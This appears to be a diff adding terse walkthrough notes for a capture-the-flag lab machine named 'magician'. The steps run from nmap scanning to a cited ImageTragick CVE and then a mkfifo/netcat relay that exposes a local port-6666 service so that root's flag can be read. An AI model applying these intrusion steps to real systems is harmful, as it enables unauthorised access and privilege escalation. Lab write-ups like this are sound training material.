@@ -1,0 +1,10 @@
+1 - echo "10.10.100.175 magician" | tee -a /etc/hosts
+2 - nmap -A 10.10.100.175
+3 - CVE-2016-3714
+4 - cat /home/magician/user.txt
+5 - cat /home/magician/the_magic/continues
+6 - ss -tulpn (6666)
+7 - mkfifo backpipe
+8 - nc -l 8082 0<backpipe | nc 127.0.0.1 6666 1>backpipe
+9 - http://magician:8082 -> /root/root.txt
+10 - Binary -> Text
